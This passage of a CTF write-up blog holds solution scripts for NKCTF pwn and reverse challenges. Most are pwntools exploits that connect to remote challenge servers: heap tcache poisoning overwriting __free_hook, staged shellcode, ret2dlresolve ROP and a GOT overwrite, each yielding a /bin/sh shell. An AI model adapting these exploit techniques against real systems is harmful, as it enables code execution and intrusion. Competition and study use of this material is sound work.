class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>e=ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>context.binary=e<br>libc=ELF(<span class="hljs-string">&quot;./libc-2.32.so&quot;</span>)<br><span class="hljs-comment">#libc=ELF(&#x27;/lib/x86_64-linux-gnu/libc-2.33.so&#x27;)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">ind,size</span>):<br>    p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&quot;index: &quot;</span>,<span class="hljs-built_in">str</span>(ind))<br>    p.sendlineafter(<span class="hljs-string">&#x27;Size: &#x27;</span>,<span class="hljs-built_in">str</span>(size))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">ind</span>):<br>    p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&quot;index: &quot;</span>,<span class="hljs-built_in">str</span>(ind))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">ind,data</span>):<br>    p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&quot;index: &quot;</span>,<span class="hljs-built_in">str</span>(ind))<br>    p.sendafter(<span class="hljs-string">&#x27;content: &#x27;</span>,data)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">ind</span>):<br>    p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>,<span class="hljs-string">b&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;index: &#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">calc_fd</span>(<span class="hljs-params">c,off</span>):<br>    off1=off<br>    off=off<br>    h=<span class="hljs-built_in">hex</span>(c)[<span class="hljs-number">2</span>:].strip(<span class="hljs-string">&#x27;L&#x27;</span>)[::-<span class="hljs-number">1</span>]<br>    e=[]<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(h),<span class="hljs-number">3</span>):<br>        e.append(h[i:i+<span class="hljs-number">3</span>][::-<span class="hljs-number">1</span>])<br>    uh=[]<br>    xc=<span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> e:<br>        hc=<span class="hljs-built_in">int</span>(i,<span class="hljs-number">16</span>)^(xc+(off&amp;<span class="hljs-number">0xfff</span>))<br>        xc=hc<br>        off=off&gt;&gt;<span class="hljs-number">12</span><br>        uh.append(<span class="hljs-built_in">hex</span>(hc)[<span class="hljs-number">2</span>:].strip(<span class="hljs-string">&#x27;L&#x27;</span>).zfill(<span class="hljs-number">3</span>))<br>    heap_len=<span class="hljs-built_in">len</span>(h)-<span class="hljs-number">3</span><br>    uh=<span class="hljs-string">&#x27;&#x27;</span>.join(uh[::-<span class="hljs-number">1</span>])[-heap_len:]+<span class="hljs-string">&#x27;000&#x27;</span><br>    fd=<span class="hljs-built_in">int</span>(uh,<span class="hljs-number">16</span>)+off1<br>    <span class="hljs-keyword">return</span> fd<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">enc_fd</span>(<span class="hljs-params">fd,next_</span>):<br>    <span class="hljs-keyword">return</span> (fd&gt;&gt;<span class="hljs-number">12</span>)^next_<br><br><br><span class="hljs-comment">#p=process(&#x27;./pwn&#x27;)</span><br>p=remote(<span class="hljs-string">&#x27;node2.yuzhian.com.cn&#x27;</span>,<span class="hljs-string">&#x27;32973&#x27;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>):<br>    add(i,<span class="hljs-number">0x88</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>    free(i)<br><br><span class="hljs-comment">#gdb.attach(p)</span><br><span class="hljs-comment">#pause()</span><br><br>add(<span class="hljs-number">7</span>,<span class="hljs-number">0x48</span>)<br>edit(<span class="hljs-number">7</span>,<span class="hljs-string">b&#x27;\n&#x27;</span>)<br>show(<span class="hljs-number">7</span>)<br><br>pause()<br>d=u64(p.read(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))&amp;<span class="hljs-number">0xffffffffffffff00</span><br>main_area=d-<span class="hljs-number">0x60</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(d))<br>malloc_hook=main_area-<span class="hljs-number">0x10</span><br>libc.address=malloc_hook-libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>free_hook=libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>system=libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    add(<span class="hljs-number">6</span>-i,<span class="hljs-number">0x88</span>)<br>show(<span class="hljs-number">1</span>)<br><br>heap_1_c=u64(p.readuntil(<span class="hljs-string">&#x27;\n&#x27;</span>,drop=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>heap=calc_fd(heap_1_c,<span class="hljs-number">0x2a0</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(heap))<br>pause()<br><br>pad=<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x58</span>+p64(<span class="hljs-number">0x91</span>)+<span class="hljs-string">b&#x27;\n&#x27;</span><br>edit(<span class="hljs-number">1</span>,pad)<br>edit(<span class="hljs-number">2</span>,pad)<br>edit(<span class="hljs-number">3</span>,pad)<br><br>pad1=<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x88</span>+<span class="hljs-string">b&#x27;\xf1&#x27;</span><br>edit(<span class="hljs-number">0</span>,pad1)<br>free(<span class="hljs-number">1</span>)<br><br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0xe8</span>)<br>free(<span class="hljs-number">3</span>)<br>free(<span class="hljs-number">2</span>)<br><br>payload=<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x88</span>+p64(<span class="hljs-number">0x91</span>)+p64(enc_fd(heap+<span class="hljs-number">0x290</span>+<span class="hljs-number">0x90</span>+<span class="hljs-number">0x90</span>+<span class="hljs-number">0x10</span>,free_hook))+<span class="hljs-string">b&#x27;\n&#x27;</span><br>edit(<span class="hljs-number">1</span>,payload)<br><br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">b&#x27;/bin/sh\x00\n&#x27;</span>)<br><br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x88</span>)<br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0x88</span>)<br>edit(<span class="hljs-number">3</span>,p64(system)+<span class="hljs-string">b&#x27;\n&#x27;</span>)<br>free(<span class="hljs-number">0</span>)<br><br><br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="9961code">9961code</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><br>sh=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">mov rdi,r15</span><br><span class="hljs-string">and esi,edi</span><br><span class="hljs-string">mov dx,0xf</span><br><span class="hljs-string">add eax,0x30</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">mov esi,edi</span><br><span class="hljs-string">xor edi,edi</span><br><span class="hljs-string">jmp rsi</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br>sh1=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">add edx,0x30</span><br><span class="hljs-string">mov ax,0</span><br><span class="hljs-string">jmp rsi</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br>sh2=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">    mov edi,0x9961020</span><br><span class="hljs-string">    xor rsi,rsi</span><br><span class="hljs-string">    xor rdx,rdx</span><br><span class="hljs-string">    mov ax,0x3b</span><br><span class="hljs-string">    syscall&quot;&quot;&quot;</span><br><br><br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(asm(sh)))<br><span class="hljs-comment">#p=process(&#x27;./pwn&#x27;)</span><br>p=remote(<span class="hljs-string">&quot;node2.yuzhian.com.cn:32041&quot;</span>)<br><span class="hljs-comment">#gdb.attach(p,&#x27;bp main+294&#x27;)</span><br><span class="hljs-comment">#p=remote(&quot;node2.yuzhian.com.cn:30693&quot;)</span><br>pause()<br>p.sendafter(<span class="hljs-string">&#x27;shellcode&#x27;</span>,asm(sh))<br>pause()<br>p.sendline(asm(sh1))<br>pause()<br>p.sendline(asm(sh2).ljust(<span class="hljs-number">0x20</span>,<span class="hljs-string">b&#x27;\x90&#x27;</span>)+<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="only-read">only_read</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> base64<br><br>e=ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>read=<span class="hljs-number">0x4013d0</span><br>leave=<span class="hljs-number">0x4013e7</span><br>ret=<span class="hljs-number">0x4013e8</span><br><span class="hljs-keyword">from</span> mcrypt <span class="hljs-keyword">import</span> *<br><br><br>c=[<span class="hljs-string">b&quot;Welcome to NKCTF!\x00&quot;</span>,\<br>        <span class="hljs-string">b&quot;tell you a secret:\x00&quot;</span>,\<br>        <span class="hljs-string">b&quot;I&#x27;M RUNNING ON GLIBC 2.31-0ubuntu9.9\x00&quot;</span>,\<br>        <span class="hljs-string">b&quot;can you find me?\x00&quot;</span>]<br><br><span class="hljs-comment">#p=process(&#x27;./pwn&#x27;)</span><br>p=remote(<span class="hljs-string">&quot;node2.yuzhian.com.cn:31146&quot;</span>)<br>base=b64()<br>base.setbase(<span class="hljs-string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> c:<br>    <span class="hljs-built_in">print</span>(i)<br>    p.sendline(base.encode(i))<br>    pause()<br><br>rel=<span class="hljs-number">0x4005d8</span><br><span class="hljs-comment">#str_t=0x3ff388</span><br><span class="hljs-comment">#sym=0x3ff420</span><br>sym=<span class="hljs-number">0x4003d0</span><br>str_t=<span class="hljs-number">0x4004c0</span><br>bss=<span class="hljs-number">0x404900</span>+<span class="hljs-number">0xc0</span>*<span class="hljs-number">8</span>+<span class="hljs-number">0x40</span>+<span class="hljs-number">0x20</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(bss))<br>sym_ind=<span class="hljs-number">905</span><br>func_got=e.got[<span class="hljs-string">&#x27;memset&#x27;</span>]<br><br>rdi=<span class="hljs-number">0x00401683</span><br>rel_add=bss+<span class="hljs-number">6</span>*<span class="hljs-number">0x8</span>+<span class="hljs-number">0x18</span><br>sym_add=bss+<span class="hljs-number">6</span>*<span class="hljs-number">0x8</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(rel_add))<br><br>gogo=<span class="hljs-number">0x401039</span><br><span class="hljs-comment">#p.interactive()</span><br><br>pad=<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x10</span><br>pad_n=<span class="hljs-number">3</span><br>bin_sh=bss<br>system=bss+<span class="hljs-number">0x28</span><br>str_=<span class="hljs-string">b&#x27;/bin/sh\x00\x00system\x00&#x27;</span><br>sym_=p32(system-str_t)+p64(<span class="hljs-number">12</span>)+p32(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span><br>rel_=p64(bss-<span class="hljs-number">0x30</span>)+p32(<span class="hljs-number">7</span>)+p32((sym_add-sym)//<span class="hljs-number">0x18</span>)+p32(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span><br><br><span class="hljs-comment">#gdb.attach(p,&#x27;bp 0x401039&#x27;)</span><br><span class="hljs-comment">#pause()</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(rel_add-rel))<br><br><br><br>payload2=<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x30</span><br>payload2+=<span class="hljs-string">b&quot;/bin/sh\x00&quot;</span>+p64(rdi)+p64(bin_sh)+p64(gogo)+p64((rel_add-rel)//<span class="hljs-number">0x18</span>+<span class="hljs-number">1</span>)<br>payload2+=<span class="hljs-string">b&quot;system\x00\x00&quot;</span><br>payload2+=sym_+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>+rel_<br><br><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x30</span>+p64(bss)+p64(read)<br>p.sendline(payload)<br>pause()<br><br>p.sendline(payload2)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="note">note</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">ind,size,data=<span class="hljs-string">&quot; &quot;</span></span>):<br>    p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br>    p.sendlineafter(<span class="hljs-string">&#x27;Size: &#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>    p.sendafter(<span class="hljs-string">&quot;Content: &quot;</span>,data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">ind,data</span>):<br>    p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br>    p.sendlineafter(<span class="hljs-string">&#x27;Size: &#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(data)))<br>    p.sendafter(<span class="hljs-string">&quot;Content: &quot;</span>,data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">ind</span>):<br>    p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">ind</span>):<br>    p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br><br><br><br><br>e=ELF(<span class="hljs-string">&#x27;./nk_note&#x27;</span>)<br>context.binary=e<br>libc=ELF(<span class="hljs-string">&#x27;./libc.so&#x27;</span>)<br><br>p=remote(<span class="hljs-string">&quot;node2.yuzhian.com.cn:30946&quot;</span>)<br><span class="hljs-comment">#p=process(&quot;./nk_note&quot;)</span><br><span class="hljs-comment">#gdb.attach(p)</span><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>show(<span class="hljs-number">16</span>)<br>d=u64(p.readuntil(<span class="hljs-string">&#x27;\n&#x27;</span>,drop=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(d))<br>pause()<br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x500</span>,<span class="hljs-string">&quot;/bin/sh\x00&quot;</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x300</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x100</span>)<br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0x80</span>)<br>add(<span class="hljs-number">4</span>,<span class="hljs-number">0x40</span>)<br>add(<span class="hljs-number">5</span>,<span class="hljs-number">0x20</span>)<br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span><br>edit(<span class="hljs-number">16</span>,payload)<br>show(<span class="hljs-number">16</span>)<br>p.readuntil(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>)<br>d1=u64(p.readuntil(<span class="hljs-string">&#x27;\n&#x27;</span>,drop=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(d1))<br>e.address=d1-<span class="hljs-number">0x4120</span><br><br>func=<span class="hljs-string">&#x27;puts&#x27;</span><br>func_got=e.got[func]<br><br><br>l=[]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x6B</span>):<br>    payload=<span class="hljs-string">&#x27;a&#x27;</span>*i*<span class="hljs-number">8</span><br>    edit(<span class="hljs-number">16</span>,payload)<br>    show(<span class="hljs-number">16</span>)<br>    data=p.readuntil(<span class="hljs-string">&#x27;\n&#x27;</span>,drop=<span class="hljs-number">1</span>).strip(<span class="hljs-string">b&#x27;a&#x27;</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    dn=u64(data)<br>    l.append(dn)<br><br><span class="hljs-built_in">print</span>(l)<br>pause()<br>payload=flat(l)+p64(e.address+<span class="hljs-number">0x4150</span>)<br>edit(<span class="hljs-number">16</span>,payload)<br>ind=<span class="hljs-number">0x26</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(e.address))<br><br>add(<span class="hljs-number">5</span>,<span class="hljs-number">0x40</span>)<br><br>edit(<span class="hljs-number">5</span>,p64(func_got))<br>show(ind)<br>dd=u64(p.readuntil(<span class="hljs-string">&#x27;\n&#x27;</span>,drop=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(dd))<br>libc.address=dd-libc.sym[func]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc.address))<br>system=libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(e.got[<span class="hljs-string">&#x27;free&#x27;</span>]))<br>edit(<span class="hljs-number">5</span>,p64(e.got[<span class="hljs-string">&#x27;free&#x27;</span>]))<br>edit(ind,p64(system))<br>free(<span class="hljs-number">0</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><h1>reverse</h1><h2 id="ez-baby-apk">ez_baby_apk</h2><p>使用jadx加雷电模拟器进行调试</p><p><img src="/img/blog_img/NKCTF/page_Image/png33.png" srcset="/img/loading.gif" lazyload alt=""></p><p><img src="/img/blog_img/NKCTF/page_Image/png34.png" srcset="/img/loading.gif" lazyload alt=""></p><p><img src="/img/blog_img/NKCTF/page_Image/png35.png" srcset="/img/loading.gif" lazyload alt=""></p><h2 id="PMKF">PMKF</h2><p><img src="/img/blog_img/NKCTF/page_Image/png36.jpg" srcset="/img/loading.gif" lazyload alt=""></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python">a=[<span class="hljs-string">&quot;1122&quot;</span>,<span class="hljs-string">&quot;3322&quot;</span>,<span class="hljs-string">&quot;1223&quot;</span>,<span class="hljs-string">&quot;2211&quot;</span>,<span class="hljs-string">&quot;0111&quot;</span>,<span class="hljs-string">&quot;1101&quot;</span>,<span class="hljs-string">&quot;0000&quot;</span>,<span class="hljs-string">&quot;0101&quot;</span>,<span class="hljs-string">&quot;1211&quot;</span>,<span class="hljs-string">&quot;0111&quot;</span>,<span class="hljs-string">&quot;2223&quot;</span>,<span class="hljs-string">&quot;2330&quot;</span>,<span class="hljs-string">&quot;3323&quot;</span>,<span class="hljs-string">&quot;2211&quot;</span>,<span class="hljs-string">&quot;1112&quot;</span>,<span class="hljs-string">&quot;2333&quot;</span>]<br>e=[]<br>k=<span class="hljs-string">b&#x27;nkman&#x27;</span><br>k1=<span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> k:<br>    k1+=i<br>k1=k1&amp;<span class="hljs-number">0xff</span><br><span class="hljs-built_in">print</span>(k1)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> a:<br>    c=<span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> i:<br>        c+=<span class="hljs-built_in">bin</span>(<span class="hljs-built_in">int</span>(j))[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">2</span>)<br>    e.append(<span class="hljs-built_in">int</span>(c,<span class="hljs-number">2</span>)^k1)<br><span class="hljs-built_in">print</span>((<span class="hljs-string">b&#x27;\x05&#x27;</span>+<span class="hljs-string">b&#x27;nkman&#x27;</span>+<span class="hljs-built_in">bytes</span>(e)).<span class="hljs-built_in">hex</span>())<br></code></pre></td></tr></table></figure><h2 id="babyrust">babyrust</h2><p><img src="/img/blog_img/NKCTF/page_Image/png37.jpg" srcset="/img/loading.gif" lazyload alt=""></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">a=<span class="hljs-string">b&quot;)&amp;n_qFb&#x27;NZXpj)*bLDmLnVj]@^_H&quot;</span><br>e=[]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> a:<br>    d=(i-<span class="hljs-number">0x28</span>+<span class="hljs-number">45</span>)^<span class="hljs-number">0x30</span><br>    <span class="hljs-keyword">if</span> d&lt;<span class="hljs-number">0x20</span>:<br>        d=d+<span class="hljs-number">48</span><br>    e.append(d)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>(e))<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2022西湖论剑-初赛</title>
    <link href="/page/wp/2022%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E5%88%9D%E8%B5%9Bwp/"/>
    <url>/page/wp/2022%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E5%88%9D%E8%B5%9Bwp/</url>
    
    <content type="html"><![CDATA[<h1>Reverse</h1><h2 id="BabyRE">BabyRE</h2><p>程序先对输入的数据进行<code>base8</code>加密，并将加密后数据的<code>0x10~0x70</code>与<code>16230465152334621443147115031070150320711603206314033466154344611443406614230466156344661543046</code>比较<br>然后对加密后数据的<code>0~0x70</code>进行魔改过的<code>sha1</code>加密，并将哈希值与<code>67339fc92b4875b8c073c76994ef1ca4ce632d26</code>比较<br>最后将输入数据的<code>0x2a~0x30</code>作为密钥，对<code>base8</code>加密后数据的前<code>0x70</code>个字节进行<code>rc4</code>加密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span 